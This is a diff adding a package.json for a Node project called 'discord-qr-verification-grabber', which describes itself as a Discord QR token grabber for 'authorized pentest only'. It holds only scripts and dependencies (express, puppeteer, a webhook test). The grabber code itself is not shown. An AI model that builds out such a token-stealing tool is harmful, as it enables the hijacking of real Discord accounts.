@@ -1,0 +1,24 @@
+{
+  "name": "discord-qr-verification-grabber",
+  "version": "1.0.0",
+  "description": "Discord QR token grabber — authorized pentest only",
+  "main": "src/grabber.js",
+  "scripts": {
+    "start": "node src/grabber.js",
+    "server": "node src/grabber.js --server",
+    "qr": "node src/grabber.js",
+    "webhook:test": "node src/grabber.js --webhook"
+  },
+  "dependencies": {
+    "cors": "^2.8.6",
+    "dotenv": "^16.6.1",
+    "express": "^4.22.2",
+    "puppeteer": "^22.15.0",
+    "sharp": "^0.33.5"
+  },
+  "keywords": [],
+  "author": "",
+  "license": "ISC",
+  "type": "commonjs",
+  "devDependencies": {}
+}
